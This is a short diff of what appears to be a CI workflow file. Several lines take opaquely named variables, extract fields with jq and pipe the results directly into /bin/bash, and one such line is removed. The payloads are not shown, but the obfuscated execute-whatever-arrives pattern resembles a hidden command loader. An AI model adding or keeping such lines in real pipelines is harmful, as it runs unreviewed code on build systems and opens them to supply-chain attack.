@@ -20,7 +20,6 @@ jobs:
           echo $z923 | jq -r .l2 | /bin/bash
           echo $obp7 | jq -r .u21672 | /bin/bash
           echo $xs1242 | jq -r .jgi6 | /bin/bash
-          printf '%s' "$uliu95540" | jq -r .g409 | /bin/bash
           printf '%s' "$d4773" | jq -r .f185 | /bin/bash
           echo $pd7 | jq -r .jwcxk691 | /bin/bash
 
